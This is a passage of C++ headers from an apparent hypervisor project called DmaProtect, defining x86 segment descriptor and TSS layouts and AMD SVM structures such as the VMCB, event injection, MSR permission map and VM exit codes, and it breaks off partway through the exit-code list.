            unsigned long long Reserved1 : 8;
            unsigned long long Type : 4;
            unsigned long long System : 1; // Must be 0 (0 = System (LDT, TSS, Gate), 1 = User (Code, Data))
            unsigned long long Dpl : 2;
            unsigned long long Present : 1;
            unsigned long long Reserved2 : 16;
        } task;
    };
    static_assert(sizeof(Gate) == sizeof(unsigned long long));

    union
    {
        unsigned long long raw;
        Segment segment;
        Gate gate;
    };
};
static_assert(sizeof(Descriptor<Mode::legacy>) == sizeof(unsigned long long));



template <>
struct Descriptor<Mode::longMode>
{
    enum class Type
    {
        Type64BitLdt = 0x02,
        TypeAvailable64BitTss = 0x09,
        TypeBusy64BitTss = 0x0B,
        Type64BitCallGate = 0x0C,
        Type64BitInterruptGate = 0x0E,
        Type64BitTrapGate = 0x0F,
    };

    union Segment
    {
        unsigned long long val;
        struct
        {
            unsigned long long SegmentLimitLow : 16;
            unsigned long long Reserved0 : 24; // Base address low[15:0]+middle[23:16], marked as reserved: USER_*** and SYSTEM_*** addresses lengths are different
            unsigned long long Type : 4; // 1 = Code, 0 = Data
            unsigned long long System : 1; // 0 = System (LDT, TSS, Gate), 1 = User (Code, Data)
            unsigned long long Dpl : 2;
            unsigned long long Present : 1;
            unsigned long long SegmentLimitHigh : 4;
            unsigned long long Available : 1;
            unsigned long long LongMode : 1; // For the SystemSegment::code only, otherwise is reserved
            unsigned long long Reserved1 : 1;
            unsigned long long Granularity : 1;
            unsigned long long Reserved2 : 8; // Base address high[31:24 or 63:24], marked as reserved: USER_*** and SYSTEM_*** addresses lengths are different
            // ... Here may be additional 8 bytes of SystemSegment if the System field is 0 ...
        } generic;
    };

    union UserSegment
    {
        unsigned long long val;

        struct
        {
            unsigned long long SegmentLimitLow : 16;
            unsigned long long BaseAddressLow : 16; // [15:0]
            unsigned long long BaseAddressMiddle : 8; // [23:16]
            unsigned long long Type : 4; // 1 = Code, 0 = Data
            unsigned long long System : 1; // Must be 1 (0 = System (LDT, TSS, Gate), 1 = User (Code, Data))
            unsigned long long Dpl : 2;
            unsigned long long Present : 1;
            unsigned long long SegmentLimitHigh : 4;
            unsigned long long Available : 1;
            unsigned long long LongMode : 1;
            unsigned long long DefaultOperandSize : 1; // Must be 0 (0 = 64-bit, 1 = Reserved)
            unsigned long long Granularity : 1; // 1 = Segment size is SegmentLimit * 4096 bytes, 0 = Segment size is SegmentLimit bytes
            unsigned long long BaseAddressHigh : 8; // [31:24]
        } generic;

        struct
        {
            /* COMPAT MODE ONLY */ unsigned long long SegmentLimitLow : 16;
            /* COMPAT MODE ONLY */ unsigned long long BaseAddressLow : 16; // [15:0]
            /* COMPAT MODE ONLY */ unsigned long long BaseAddressMiddle : 8; // [23:16]
            /* COMPAT MODE ONLY */ unsigned long long Accessed : 1;
            /* COMPAT MODE ONLY */ unsigned long long Readable : 1;
            unsigned long long Conforming : 1;
            unsigned long long Type : 1; // Must be 1 (1 = Code, 0 = Data)
            unsigned long long System : 1; // Must be 1 (0 = System (LDT, TSS, Gate), 1 = User (Code, Data))
            unsigned long long Dpl : 2;
            unsigned long long Present : 1;
            /* COMPAT MODE ONLY */ unsigned long long SegmentLimitHigh : 4;
            /* COMPAT MODE ONLY */ unsigned long long Available : 1;
            unsigned long long LongMode : 1;
            unsigned long long DefaultOperandSize : 1; // Must be 0 (0 = 64-bit, 1 = Reserved)
            /* COMPAT MODE ONLY */ unsigned long long Granularity : 1; // 1 = Segment size is SegmentLimit * 4096 bytes, 0 = Segment size is SegmentLimit bytes
            /* COMPAT MODE ONLY */ unsigned long long BaseAddressHigh : 8; // [31:24]
        } code;

        struct
        {
            /* COMPAT MODE ONLY */ unsigned long long SegmentLimitLow : 16;
            /* COMPAT MODE ONLY */ unsigned long long BaseAddressLow : 16; // [15:0]
            /* COMPAT MODE ONLY */ unsigned long long BaseAddressMiddle : 8; // [23:16]
            /* COMPAT MODE ONLY */ unsigned long long Accessed : 1;
            /* COMPAT MODE ONLY */ unsigned long long Writeable : 1;
            /* COMPAT MODE ONLY */ unsigned long long ExpandDown : 1;
            /* COMPAT MODE ONLY */ unsigned long long Type : 1; // Must be 0 (1 = Code, 0 = Data)
            /* COMPAT MODE ONLY */ unsigned long long System : 1; // Must be 1 (0 = System (LDT, TSS, Gate), 1 = User (Code, Data))
            /* COMPAT MODE ONLY */ unsigned long long Dpl : 2;
            unsigned long long Present : 1;
            /* COMPAT MODE ONLY */ unsigned long long SegmentLimitHigh : 4;
            /* COMPAT MODE ONLY */ unsigned long long Available : 1;
            /* COMPAT MODE ONLY */ unsigned long long Reserved : 1;
            /* COMPAT MODE ONLY */ unsigned long long DefaultOperandSize : 1; // 1 = 32-bit, 0 = 16-bit
            /* COMPAT MODE ONLY */ unsigned long long Granularity : 1; // 1 = Segment size is SegmentLimit * 4096 bytes, 0 = Segment size is SegmentLimit bytes
            /* COMPAT MODE ONLY */ unsigned long long BaseAddressHigh : 8; // [31:24]
        } data;
    };
    static_assert(sizeof(UserSegment) == sizeof(unsigned long long));

    // LDT or TSS:
    union SystemSegment
    {
        struct
        {
            unsigned long long low;
            unsigned long long high;
        } val;

        struct
        {
            unsigned long long SegmentLimitLow : 16;
            unsigned long long BaseAddressLow : 16; // [15:0]
            unsigned long long BaseAddressMiddle : 8; // [23:16]
            unsigned long long Type : 4; // SegmentDescriptorTypeLong
            unsigned long long System : 1; // Must be 0 (0 = System (LDT, TSS, Gate), 1 = User (Code, Data))
            unsigned long long Dpl : 2;
            unsigned long long Present : 1;
            unsigned long long SegmentLimitHigh : 4;
            unsigned long long Available : 1;
            unsigned long long Reserved0 : 2;
            unsigned long long Granularity : 1; // 1 = Segment size is SegmentLimit * 4096 bytes, 0 = Segment size is SegmentLimit bytes
            unsigned long long BaseAddressHigh : 8; // [32:24]
            unsigned long long BaseAddressHighest : 32; // [63:32]
            unsigned long long Reserved1 : 8;
            unsigned long long MustBeZero : 5;
            unsigned long long Reserved2 : 19;
        } layout;
    };
    static_assert(sizeof(SystemSegment) == 2 * sizeof(unsigned long long));

    union Gate
    {
        struct
        {
            unsigned long long low;
            unsigned long long high;
        } val;

        struct
        {
            unsigned long long TargetOffsetLow : 16; // [15:0]
            unsigned long long TargetSelector : 16;
            unsigned long long Reserved0 : 8;
            unsigned long long Type : 4; // SegmentDescriptorTypeLong
            unsigned long long System : 1; // Must be 0 (0 = System (LDT, TSS, Gate), 1 = User (Code, Data))
            unsigned long long Dpl : 2;
            unsigned long long Present : 1;
            unsigned long long TargetOffsetMiddle : 16; // [31:16]
            unsigned long long TargetOffsetHigh : 32; // [63:32]
            unsigned long long Reserved1 : 8;
            unsigned long long MustBeZero : 5;
            unsigned long long Reserved2 : 19;
        } call;

        struct
        {
            unsigned long long TargetOffsetLow : 16; // [15:0]
            unsigned long long TargetSelector : 16;
            unsigned long long InterruptStackTable : 3;
            unsigned long long Reserved0 : 5;
            unsigned long long Type : 4; // SegmentDescriptorTypeLong
            unsigned long long System : 1; // Must be 0 (0 = System (LDT, TSS, Gate), 1 = User (Code, Data))
            unsigned long long Dpl : 2;
            unsigned long long Present : 1;
            unsigned long long TargetOffsetMiddle : 16; // [31:16]
            unsigned long long TargetOffsetHigh : 32; // [63:32]
            unsigned long long Reserved1 : 32;
        } interrupt, trap;
    };
    static_assert(sizeof(Gate) == 2 * sizeof(unsigned long long));

    union
    {
        unsigned long long userRaw;
        struct
        {
            unsigned long long high;
            unsigned long long low;
        } systemRaw, gateRaw;

        UserSegment user;
        SystemSegment system;
        Gate gate;
    };
};
static_assert(sizeof(Descriptor<Mode::longMode>) == 2 * sizeof(unsigned long long));



template <Mode mode>
struct Tss;

template <>
struct Tss<Mode::legacy>
{
    unsigned short Link; // Prior TSS selector
    unsigned short Reserved0;
    unsigned int Esp0;
    unsigned short Ss0;
    unsigned short Reserved1;
    unsigned int Esp1;
    unsigned short Ss1;
    unsigned short Reserved2;
    unsigned int Esp2;
    unsigned short Ss2;
    unsigned short Reserved3;
    unsigned int Cr3;
    unsigned int Eip;
    unsigned int EFlags;
    unsigned int Eax;
    unsigned int Ecx;
    unsigned int Edx;
    unsigned int Ebx;
    unsigned int Esp;
    unsigned int Ebp;
    unsigned int Esi;
    unsigned int Edi;
    unsigned short Es;
    unsigned short Reserved4;
    unsigned short Cs;
    unsigned short Reserved5;
    unsigned short Ss;
    unsigned short Reserved6;
    unsigned short Ds;
    unsigned short Reserved7;
    unsigned short Fs;
    unsigned short Reserved8;
    unsigned short Gs;
    unsigned short Reserved9;
    unsigned short LdtSelector;
    unsigned short Reserved10;
    unsigned short Trap : 1;
    unsigned short Reserved11 : 15;
    unsigned short IopbBaseAddress;
    unsigned int ShadowStackPointer; // Intel platforms only
    // ... Operating system data structure ...
    // Interrupt-redirection bitmap (eight 32-bit locations)
    // IOPB (up to 8 Kbytes)
    // ^ TSS Limit in the Descriptor<Mode::legacy>::Segment::tss::SegmentLimit
};
static_assert(sizeof(Tss<Mode::legacy>) == 27 * sizeof(unsigned int));

template <>
struct Tss<Mode::longMode>
{
    unsigned int Reserved0;
    unsigned int Rsp0Lower;
    unsigned int Rsp0Upper;
    unsigned int Rsp1Lower;
    unsigned int Rsp1Upper;
    unsigned int Rsp2Lower;
    unsigned int Rsp2Upper;
    unsigned long long Reserved1;
    unsigned int Ist1Lower; // Interrupt stack table (lower part)
    unsigned int Ist1Upper; // Interrupt stack table (higher part)
    unsigned int Ist2Lower;
    unsigned int Ist2Upper;
    unsigned int Ist3Lower;
    unsigned int Ist3Upper;
    unsigned int Ist4Lower;
    unsigned int Ist4Upper;
    unsigned int Ist5Lower;
    unsigned int Ist5Upper;
    unsigned int Ist6Lower;
    unsigned int Ist6Upper;
    unsigned int Ist7Lower;
    unsigned int Ist7Upper;
    unsigned long long Reserved2;
    unsigned short Reserved3;
    unsigned short IopbBaseAddress;
    // IOPB (up to 8 Kbytes)
    // ^ TSS Limit in the Descriptor<Mode::longMode>::Segment::tss::SegmentLimit
};
static_assert(sizeof(Tss<Mode::longMode>) == 26 * sizeof(unsigned int));



} // namespace Seg


#pragma pack(pop)
```

`DmaProtect/include/Arch/Svm.h`:

```h
#pragma once


namespace Svm
{

union NPFInfo {
    struct {
        unsigned long long present : 1;
        unsigned long long write : 1;
        unsigned long long user : 1;
        unsigned long long reserved : 1;
        unsigned long long execute : 1;
        unsigned long long unused0 : 1;
        unsigned long long shadowstack : 1;
        unsigned long long unused1 : 25;
        unsigned long long nested : 1;
        unsigned long long paging : 1;
        unsigned long long supervisorshadowstack : 1;
        unsigned long long unused2 : 29;
    };
    unsigned long long raw;
};

struct VmcbControlArea
{
    union
    {
        unsigned int raw;
        struct
        {
            union
            {
                unsigned short raw; // Interception of CR0..CR15 reads
                struct
                {
                    unsigned short ReadCr0 : 1;
                    unsigned short ReadCr1 : 1;
                    unsigned short ReadCr2 : 1;
                    unsigned short ReadCr3 : 1;
                    unsigned short ReadCr4 : 1;
                    unsigned short ReadCr5 : 1;
                    unsigned short ReadCr6 : 1;
                    unsigned short ReadCr7 : 1;
                    unsigned short ReadCr8 : 1;
                    unsigned short ReadCr9 : 1;
                    unsigned short ReadCr10 : 1;
                    unsigned short ReadCr11 : 1;
                    unsigned short ReadCr12 : 1;
                    unsigned short ReadCr13 : 1;
                    unsigned short ReadCr14 : 1;
                    unsigned short ReadCr15 : 1;
                } layout;
            } read;
            union
            {
                unsigned short raw; // Interception of CR0..CR15 writes
                struct
                {
                    unsigned short WriteCr0 : 1;
                    unsigned short WriteCr1 : 1;
                    unsigned short WriteCr2 : 1;
                    unsigned short WriteCr3 : 1;
                    unsigned short WriteCr4 : 1;
                    unsigned short WriteCr5 : 1;
                    unsigned short WriteCr6 : 1;
                    unsigned short WriteCr7 : 1;
                    unsigned short WriteCr8 : 1;
                    unsigned short WriteCr9 : 1;
                    unsigned short WriteCr10 : 1;
                    unsigned short WriteCr11 : 1;
                    unsigned short WriteCr12 : 1;
                    unsigned short WriteCr13 : 1;
                    unsigned short WriteCr14 : 1;
                    unsigned short WriteCr15 : 1;
                } layout;
            } write;
        } rw;
    } InterceptCr;

    union
    {
        unsigned int raw;
        struct
        {
            union
            {
                unsigned short raw; // Interception of CR0..CR15 reads
                struct
                {
                    unsigned short ReadDr0 : 1;
                    unsigned short ReadDr1 : 1;
                    unsigned short ReadDr2 : 1;
                    unsigned short ReadDr3 : 1;
                    unsigned short ReadDr4 : 1;
                    unsigned short ReadDr5 : 1;
                    unsigned short ReadDr6 : 1;
                    unsigned short ReadDr7 : 1;
                    unsigned short ReadDr8 : 1;
                    unsigned short ReadDr9 : 1;
                    unsigned short ReadDr10 : 1;
                    unsigned short ReadDr11 : 1;
                    unsigned short ReadDr12 : 1;
                    unsigned short ReadDr13 : 1;
                    unsigned short ReadDr14 : 1;
                    unsigned short ReadDr15 : 1;
                } layout;
            } read;
            union
            {
                unsigned short raw; // Interception of CR0..CR15 writes
                struct
                {
                    unsigned short WriteDr0 : 1;
                    unsigned short WriteDr1 : 1;
                    unsigned short WriteDr2 : 1;
                    unsigned short WriteDr3 : 1;
                    unsigned short WriteDr4 : 1;
                    unsigned short WriteDr5 : 1;
                    unsigned short WriteDr6 : 1;
                    unsigned short WriteDr7 : 1;
                    unsigned short WriteDr8 : 1;
                    unsigned short WriteDr9 : 1;
                    unsigned short WriteDr10 : 1;
                    unsigned short WriteDr11 : 1;
                    unsigned short WriteDr12 : 1;
                    unsigned short WriteDr13 : 1;
                    unsigned short WriteDr14 : 1;
                    unsigned short WriteDr15 : 1;
                } layout;
            } write;
        } rw;
    } InterceptDr;

    union
    {
        unsigned int raw;
        struct
        {
            unsigned int InterceptionVector0 : 1;
            unsigned int InterceptionVector1 : 1;
            unsigned int InterceptionVector2 : 1;
            unsigned int InterceptionVector3 : 1;
            unsigned int InterceptionVector4 : 1;
            unsigned int InterceptionVector5 : 1;
            unsigned int InterceptionVector6 : 1;
            unsigned int InterceptionVector7 : 1;
            unsigned int InterceptionVector8 : 1;
            unsigned int InterceptionVector9 : 1;
            unsigned int InterceptionVector10 : 1;
            unsigned int InterceptionVector11 : 1;
            unsigned int InterceptionVector12 : 1;
            unsigned int InterceptionVector13 : 1;
            unsigned int InterceptionVector14 : 1;
            unsigned int InterceptionVector15 : 1;
            unsigned int InterceptionVector16 : 1;
            unsigned int InterceptionVector17 : 1;
            unsigned int InterceptionVector18 : 1;
            unsigned int InterceptionVector19 : 1;
            unsigned int InterceptionVector20 : 1;
            unsigned int InterceptionVector21 : 1;
            unsigned int InterceptionVector22 : 1;
            unsigned int InterceptionVector23 : 1;
            unsigned int InterceptionVector24 : 1;
            unsigned int InterceptionVector25 : 1;
            unsigned int InterceptionVector26 : 1;
            unsigned int InterceptionVector27 : 1;
            unsigned int InterceptionVector28 : 1;
            unsigned int InterceptionVector29 : 1;
            unsigned int InterceptionVector30 : 1;
            unsigned int InterceptionVector31 : 1;
        } layout;
    } InterceptExceptions;

    unsigned int InterceptIntr : 1; // Physical maskable interrupt
    unsigned int InterceptNmi : 1;
    unsigned int InterceptSmi : 1;
    unsigned int InterceptInit : 1;
    unsigned int InterceptVirtualIntr : 1; // Virtual maskable interrupt
    unsigned int InterceptCr0WritesOther : 1; // Intercept CR0 writes that change bits other than CR0.TS or CR0.MP
    unsigned int InterceptIdtrRead : 1;
    unsigned int InterceptGdtrRead : 1;
    unsigned int InterceptLdtrRead : 1;
    unsigned int InterceptTrRead : 1;
    unsigned int InterceptIdtrWrite : 1;
    unsigned int InterceptGdtrWrite : 1;
    unsigned int InterceptLdtrWrite : 1;
    unsigned int InterceptTrWrite : 1;
    unsigned int InterceptRdtsc : 1;
    unsigned int InterceptRdpmc : 1;
    unsigned int InterceptPushf : 1;
    unsigned int InterceptPopf : 1;
    unsigned int InterceptCpuid : 1;
    unsigned int InterceptRsm : 1;
    unsigned int InterceptIret : 1;
    unsigned int InterceptInt : 1; // Intercept Int N instruction
    unsigned int InterceptInvd : 1;
    unsigned int InterceptPause : 1;
    unsigned int InterceptHlt : 1;
    unsigned int InterceptInvlpg : 1;
    unsigned int InterceptInvlpga : 1;
    unsigned int InterceptIoIo : 1; // Intercept IN and OUT accesses to selected ports
    unsigned int InterceptMsr : 1; // Intercept RDMSR and WRMSR accesses to selected MSRs
    unsigned int InterceptTaskSwitched : 1;
    unsigned int InterceptFerrFreeze : 1; // Intercept processor "freezing" during legacy FERR handling
    unsigned int InterceptShutdown : 1; // Intercept shutdown events
    unsigned short InterceptVmrun : 1;
    unsigned short InterceptVmcall : 1;
    unsigned short InterceptVmload : 1;
    unsigned short InterceptVmsave : 1;
    unsigned short InterceptStgi : 1;
    unsigned short InterceptClgi : 1;
    unsigned short InterceptSkinit : 1;
    unsigned short InterceptRdtscp : 1;
    unsigned short InterceptIcebp : 1;
    unsigned short InterceptWbinvd : 1;
    unsigned short InterceptMonitor : 1;
    unsigned short InterceptMwaitUnconditionally : 1; // Intercept MWAIT instruction unconditionally
    unsigned short InterceptMwaitIfMonitorHwIsArmed : 1; // Intercept MWAIT instruction if monitor hardware is armed
    unsigned short InterceptXsetbv : 1;
    unsigned short Reserved0 : 1; // Should be zero
    unsigned short InterceptEferWrite : 1; // Occures after guest instruction finishes
    union
    {
        unsigned short raw;
        struct
        {
            unsigned short InterceptCr0WriteAfter : 1;
            unsigned short InterceptCr1WriteAfter : 1;
            unsigned short InterceptCr2WriteAfter : 1;
            unsigned short InterceptCr3WriteAfter : 1;
            unsigned short InterceptCr4WriteAfter : 1;
            unsigned short InterceptCr5WriteAfter : 1;
            unsigned short InterceptCr6WriteAfter : 1;
            unsigned short InterceptCr7WriteAfter : 1;
            unsigned short InterceptCr8WriteAfter : 1;
            unsigned short InterceptCr9WriteAfter : 1;
            unsigned short InterceptCr10WriteAfter : 1;
            unsigned short InterceptCr11WriteAfter : 1;
            unsigned short InterceptCr12WriteAfter : 1;
            unsigned short InterceptCr13WriteAfter : 1;
            unsigned short InterceptCr14WriteAfter : 1;
            unsigned short InterceptCr15WriteAfter : 1;
        } layout;
    } InterceptCrWritesAfter; // Occures after guest instruction finishes
    unsigned char Reserved1[40]; // Should be zero
    unsigned short PauseFilterThreshold;
    unsigned short PauseFilterCount;
    unsigned long long IopmBasePa; // Physical base address of IOPM,  bits 11:0 are ignored
    unsigned long long MsrpmBasePa; // Physical base address of MSRPM, bits 11:0 are ignored
    unsigned long long TscOffset; // To be added in RDTSC and RDTSCP
    unsigned int GuestAsid;
    union
    {
        unsigned int raw;
        struct
        {
            unsigned int TlbControl : 8; // 0x00 - Do nothing
                                            // 0x01 - Flush entire TLB (all entries, all ASIDs) on VMRUN (for legacy hypervisors)
                                            // 0x03 - Flush the guest's TLB entries
                                            // 0x07 - Flush the guest's non-global TLB entries
                                            // All other encodings are reserved
            unsigned int Reserved2 : 24;
        } layout;
    } TlbControl;
    union
    {
        unsigned long long raw;
        struct
        {
            unsigned long long VirtualTpr : 8; // Virtual TPR for the guest (3:0 = 4-bit virtual TPR value, 7:4 should be zero), written back to the VMCB at #VMEXIT
            unsigned long long VirtualIrq : 1; // If nonzero, virtual INTR is pending, ignored on VMRUN if AVIC is enabled, written back to the VMCB at #VMEXIT
            unsigned long long VirtualGif : 1; // 0 - virtual interrupts are masked, 1 - unmasked
            unsigned long long Reserved0 : 6;
            unsigned long long VirtualIntrPriority : 4; // Priority for virtual interrupt, ignored on VMRUN if AVIC is enabled
            unsigned long long VirtualIgnoreTpr : 1; // If nonzero, the current virtual interrupt ignores (virtual) TPR, ignored on VMRUN if AVIC is enabled
            unsigned long long Reserved1 : 3;
            unsigned long long VirtualIntrMasking : 1; // Virtualize masking of INTR interrupts
            unsigned long long VirtualGifEnabled : 1; // 0 - Disabled, 1 - Enabled for this guest
            unsigned long long Reserved2 : 5;
            unsigned long long AvicEnable : 1;
            unsigned long long VirtualIntrVector : 8; // Vector to use for this interrupt, ignored on VMRUN if AVIC is enabled
            unsigned long long Reserved3 : 24;
        } layout;
    } VirtualIntr;
    union
    {
        unsigned long long raw;
        struct
        {
            unsigned long long InterruptShadow : 1; // Guest is in an interrupt shadow
            unsigned long long GuestInterruptMask : 1; // Value of the RFLAGS.IF for the guest, written back to the VMCB at #VMEXIT, not used on VMRUN
            unsigned long long Reserved : 62;
        } layout;
    } InterruptShadow;
    unsigned long long ExitCode;
    unsigned long long ExitInfo1;
    unsigned long long ExitInfo2;
    unsigned long long ExitIntInfo;
    unsigned long long NpEnable : 1; // Nested paging
    unsigned long long EnableSev : 1; // Secure Encrypted Virtualization
    unsigned long long EnabledEncryptedState : 1; // Enable encrypted state for SEV
    unsigned long long Reserved2 : 61; // Should be zero
    unsigned long long AvicApicBar : 52; // Address must be 4-Kbyte aligned
    unsigned long long Reserved3 : 12;
    unsigned long long GuestGhcbPa; // Guest physical address of GHCB
    unsigned long long EventInjection;
    unsigned long long NestedPageTableCr3; // Nested page table CR3 to use for nested paging
    unsigned long long LbrVirtualizationEnable : 1; // 0 - Do nothing, 1 - Enable LBR virtualization hardware acceleration
    unsigned long long VirtualizedVmsaveVmload : 1;
    unsigned long long Reserved4 : 62;
    unsigned long long VmcbCleanBits : 32;
    unsigned long long Reserved5 : 32;
    unsigned long long NextRip; // Next sequential instruction pointer
    unsigned char NumberOfBytesFetched;
    unsigned char GuestInstructionBytes[15];
    unsigned long long AvicApicBackingPageAddr : 52; // Must be 4-Kbyte aligned
    unsigned long long Reserved6 : 12;
    unsigned long long Reserved7;
    union
    {
        unsigned long long raw;
        struct
        {
            unsigned long long AvicLogicalMaxIndex : 8;
            unsigned long long Reserved0 : 4;
            unsigned long long AvicLogicalTableAddr : 40; // Must be 4-Kbyte aligned
            unsigned long long Reserved1 : 12;
        } layout;
    } AvicLogicalTable;
    union
    {
        unsigned long long raw;
        struct
        {
            unsigned long long AvicPhysicalMaxIndex : 8;
            unsigned long long Reserved0 : 4;
            unsigned long long AvicPhysicalTableAddr : 40; // Must be 4-Kbyte aligned
            unsigned long long Reserved1 : 12;
        } layout;
    } AvicPhysicalTable;
    unsigned long long Reserved8;
    unsigned long long Reserved9 : 12;
    unsigned long long VmcbSaveStatePointer : 40;
    unsigned long long Reserved10 : 12;
    unsigned char Reserved11[752]; // Final padding to 0x400 size
};

union SegmentSelector {
    struct {
        unsigned short RPL : 2;
        unsigned short TI : 1;
        unsigned short Index : 13;
    } layout;
    unsigned short raw;
};

struct VmcbStateSaveArea
{
    union VmcbSegmentAttribute
    {
        unsigned short raw;
        struct
        {
            unsigned short Type : 4;
            unsigned short System : 1;
            unsigned short Dpl : 2;
            unsigned short Present : 1;
            unsigned short Available : 1;
            unsigned short LongMode : 1;
            unsigned short DefaultOperandSize : 1;
            unsigned short Granularity : 1;
            unsigned short Reserved : 4;
        } layout;
    };
    struct
    {
        SegmentSelector Selector;
        VmcbSegmentAttribute Attrib;
        unsigned int Limit;
        unsigned long long Base; // Only lower 32 bits are implemented
    } Es;
    struct
    {
        SegmentSelector Selector;
        VmcbSegmentAttribute Attrib;
        unsigned int Limit;
        unsigned long long Base; // Only lower 32 bits are implemented
    } Cs;
    struct
    {
        SegmentSelector Selector;
        VmcbSegmentAttribute Attrib;
        unsigned int Limit;
        unsigned long long Base; // Only lower 32 bits are implemented
    } Ss;
    struct
    {
        SegmentSelector Selector;
        VmcbSegmentAttribute Attrib;
        unsigned int Limit;
        unsigned long long Base; // Only lower 32 bits are implemented
    } Ds;
    struct
    {
        SegmentSelector Selector;
        VmcbSegmentAttribute Attrib;
        unsigned int Limit;
        unsigned long long Base;
    } Fs;
    struct
    {
        SegmentSelector Selector;
        VmcbSegmentAttribute Attrib;
        unsigned int Limit;
        unsigned long long Base;
    } Gs;
    struct
    {
        SegmentSelector Selector; // Reserved
        VmcbSegmentAttribute Attrib; // Reserved
        unsigned int Limit; // Only lower 16 bits are implemented
        unsigned long long Base;
    } Gdtr;
    struct
    {
        SegmentSelector Selector;
        VmcbSegmentAttribute Attrib;
        unsigned int Limit;
        unsigned long long Base;
    } Ldtr;
    struct
    {
        SegmentSelector Selector; // Reserved
        VmcbSegmentAttribute Attrib; // Reserved
        unsigned int Limit; // Only lower 16 bits are implemented
        unsigned long long Base;
    } Idtr;
    struct
    {
        SegmentSelector Selector;
        VmcbSegmentAttribute Attrib;
        unsigned int Limit;
        unsigned long long Base;
    } Tr;
    unsigned char Reserved0[43];
    unsigned char Cpl; // If the guest is in real-mode, CPL forced to 0, if the guest in virtual-mode, CPL forced to 3
    unsigned int Reserved1;
    unsigned long long Efer;
    unsigned char Reserved2[112];
    unsigned long long Cr4;
    unsigned long long Cr3;
    unsigned long long Cr0;
    unsigned long long Dr7;
    unsigned long long Dr6;
    unsigned long long Rflags;
    unsigned long long Rip;
    unsigned char Reserved3[88];
    unsigned long long Rsp;
    unsigned char Reserved4[24];
    unsigned long long Rax;
    unsigned long long Star;
    unsigned long long Lstar;
    unsigned long long Cstar;
    unsigned long long Sfmask;
    unsigned long long KernelGsBase;
    unsigned long long SysenterCs;
    unsigned long long SysenterEsp;
    unsigned long long SysenterEip;
    unsigned long long Cr2;
    unsigned char Reserved5[32];
    unsigned long long GuestPat;     // Guest PAT - only used if nested paging enabled
    unsigned long long DbgCtl;       // Guest debug ctl MSR - only used if HW acceleration is enabled by VMCB.LBR_VIRTUALIZATION_ENABLE
    unsigned long long BrFrom;       // Guest LastBranchFromIP MSR - only used if HW acceleration of LBR virtualization is supported and enabled
    unsigned long long BrTo;         // Guest LastBranchToIP MSR - only used if HW acceleration of LBR virtualization is supported and enabled
    unsigned long long LastExcpFrom; // Guest LastIntFromIP MSR - only used if HW acceleration of LBR virtualization is supported and enabled
    unsigned long long LastExcpTo;   // Guest LastIntToIP MSR - only used if HW acceleration of LBR virtualization is supported and enabled
};

struct Vmcb
{
    VmcbControlArea ControlArea;
    VmcbStateSaveArea StateSaveArea;
    unsigned char Reserved[0x1000 - sizeof(VmcbControlArea) - sizeof(VmcbStateSaveArea)];
};
static_assert(sizeof(VmcbControlArea) == 0x400);
static_assert(sizeof(VmcbStateSaveArea) == 0x298);
static_assert(sizeof(Vmcb) == 0x1000);

union EventInj
{
    unsigned long long raw;
    struct {
        unsigned long long Vector : 8; // IDT vector of the interrupt/exception (ignored if Type == 2)
        unsigned long long Type : 3; // 0 = External/virtual interrupt (INTR), 2 = NMI, 3 = Exception (fault/trap), 4 = Software interrupt (INTn instruction)
        unsigned long long ErrorCodeValid : 1; // 1 - Exception should push an error code onto the stack
        unsigned long long Reserved : 19;
        unsigned long long Valid : 1; // 1 - Event is to be injected into the guest
        unsigned long long ErrorCode : 32; // This error code will be pushed onto the stack if the ErrorCodeValid == 1
    } layout;
};
static_assert(sizeof(EventInj) == sizeof(unsigned long long));

// 2 bits per MSR:
union Msrpm
{
    unsigned char msrpm[2048 * 4];
    struct {
        unsigned char msrpm0[2048]; // 0000_0000 to 0000_1FFF
        unsigned char msrpm1[2048]; // C000_0000 to C000_1FFF
        unsigned char msrpm2[2048]; // C001_0000 to C001_1FFF
        unsigned char msrpm3[2048]; // Reserved
    } vectors;
};
static_assert(sizeof(Msrpm) == 8192);

enum SvmExitCode : ULONG64
{
    VMEXIT_INVALID = -1,
    VMEXIT_CR0_READ = 0,
    VMEXIT_CR1_READ,
    VMEXIT_CR2_READ,
    VMEXIT_CR3_READ,
    VMEXIT_CR4_READ,
    VMEXIT_CR5_READ,
    VMEXIT_CR6_READ,
    VMEXIT_CR7_READ,
    VMEXIT_CR8_READ,
    VMEXIT_CR9_READ,
    VMEXIT_CR10_READ,
    VMEXIT_CR11_READ,
    VMEXIT_CR12_READ,
    VMEXIT_CR13_READ,
    VMEXIT_CR14_READ,
    VMEXIT_CR15_READ,
    VMEXIT_CR0_WRITE,
    VMEXIT_CR1_WRITE,
    VMEXIT_CR2_WRITE,
    VMEXIT_CR3_WRITE,
    VMEXIT_CR4_WRITE,
    VMEXIT_CR5_WRITE,
    VMEXIT_CR6_WRITE,
    VMEXIT_CR7_WRITE,
    VMEXIT_CR8_WRITE,
    VMEXIT_CR9_WRITE,
    VMEXIT_CR10_WRITE,
    VMEXIT_CR11_WRITE,
    VMEXIT_CR12_WRITE,
    VMEXIT_CR13_WRITE,
    VMEXIT_CR14_WRITE,
    VMEXIT_CR15_WRITE,
    VMEXIT_DR0_READ,
    VMEXIT_DR1_READ,
    VMEXIT_DR2_READ,
    VMEXIT_DR3_READ,
    VMEXIT_DR4_READ,
    VMEXIT_DR5_READ,
    VMEXIT_DR6_READ,
    VMEXIT_DR7_READ,
    VMEXIT_DR8_READ,
    VMEXIT_DR9_READ,
    VMEXIT_DR10_READ,
    VMEXIT_DR11_READ,
    VMEXIT_DR12_READ,
    VMEXIT_DR13_READ,
    VMEXIT_DR14_READ,
    VMEXIT_DR15_READ,
    VMEXIT_DR0_WRITE,
    VMEXIT_DR1_WRITE,
    VMEXIT_DR2_WRITE,
    VMEXIT_DR3_WRITE,
    VMEXIT_DR4_WRITE,
    VMEXIT_DR5_WRITE,
    VMEXIT_DR6_WRITE,
    VMEXIT_DR7_WRITE,
    VMEXIT_DR8_WRITE,
    VMEXIT_DR9_WRITE,
    VMEXIT_DR10_WRITE,
    VMEXIT_DR11_WRITE,
    VMEXIT_DR12_WRITE,
    VMEXIT_DR13_WRITE,
    VMEXIT_DR14_WRITE,
    VMEXIT_DR15_WRITE,
    VMEXIT_EXCP0,
    VMEXIT_EXCP1,
    VMEXIT_EXCP2,
    VMEXIT_EXCP3,
    VMEXIT_EXCP4,
    VMEXIT_EXCP5,
    VMEXIT_EXCP6,
    VMEXIT_EXCP7,
    VMEXIT_EXCP8,
    VMEXIT_EXCP9,
    VMEXIT_EXCP10,
    VMEXIT_EXCP11,
    VMEXIT_EXCP12,
    VMEXIT_EXCP13,
    VMEXIT_EXCP14,
    VMEXIT_EXCP15,
